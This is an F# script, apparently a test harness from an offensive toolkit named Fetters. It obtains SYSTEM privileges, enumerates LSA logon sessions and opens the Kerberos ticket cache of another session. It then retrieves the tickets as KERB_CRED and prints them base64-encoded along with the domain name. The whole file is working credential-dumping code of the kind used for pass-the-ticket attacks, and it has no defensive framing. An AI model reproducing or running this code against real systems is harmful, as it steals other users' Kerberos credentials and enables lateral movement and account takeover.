open System
open System.Security.Principal
open System.Runtime.InteropServices

open Fetters.DomainTypes 
open Fetters.NI.Providers
open Fetters.WMI.Providers
open Fetters.dotNetFunctions


// Testing/rework harness
printfn "%s" <| getSystem()
let lsaHandle = registerLsaLogonProcess ()
revertToSelf () |> ignore
let count, ptr = enumerateLsaLogonSessions () 
let sessions = getLsaSessionData (count, ptr) 
let authpkg_ = sessions
                |> List.map(fun _x -> _x.loginID.lower, _x.loginID.upper)
printfn "%i"authpkg_.Length


let LSAStringQuery = LSA_STRING_IN(length = uint16("kerberos".Length), maxLength = uint16("kerberos".Length + 1), buffer = "kerberos")

let authpkg = lookupLsaAuthenticationPackage lsaHandle LSAStringQuery

let _bogusLUID = LUID(lower = fst authpkg_.[1], upper = snd authpkg_.[1])
let kerbquery = 
    KERB_QUERY_TKT_CACHE_REQUEST(messageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage, 
                                    logonID = _bogusLUID)

let kerbretrieve = 
    KERB_RETRIEVE_TKT_REQUEST(messageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveTicketMessage,
                              logonID = _bogusLUID,
                              cacheOptions = KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED)

let intauth = authpkg |> fun (LsaAuthPackage authpkg) -> authpkg


let kerbresponse = getKerberosTicketResponse lsaHandle authpkg (kerbquery |> KERB_QUERY_TKT_CACHE_REQ)
let wrappedticketlist = extractKerberosReponseTickets kerbresponse
printfn "number of extracted tickets: %i" <| wrappedticketlist.Length

let ticketlist = wrappedticketlist |> List.map(fun _tick -> match _tick with
                                                            |KERB_TKT_CACHE_INFO _t -> _t
                                                            |_ -> KERB_TICKET_CACHE_INFO())
ticketlist |> List.iter(fun _t -> printfn "%s" <| Marshal.PtrToStringAuto(_t.serverName.buffer))


let retrieveresponse = getKerberosTicketResponse lsaHandle authpkg (kerbretrieve |> KERB_RETRIEVE_TKT_REQ)
let wrappedretrieved = extractKerberosReponseTickets retrieveresponse
printfn "number of extracted tickets: %i" <| wrappedretrieved.Length

let unwrappedticket = wrappedretrieved |> List.iter(fun _t -> match _t with
                                                              |KERB_EXTERNAL_TKT __t -> let (b64tick: byte[]) = Array.create (__t.EncodedTicketSize) 0uy
                                                                                        Marshal.Copy(__t.EncodedTicket, b64tick, 0, __t.EncodedTicketSize)
                                                                                        printfn "%s" <| Convert.ToBase64String(b64tick)
                                                                                        printfn "%s" <| Marshal.PtrToStringUni(__t.DomainName.buffer, int(__t.DomainName.length))
                                                                                        
                                                              |_ -> ())
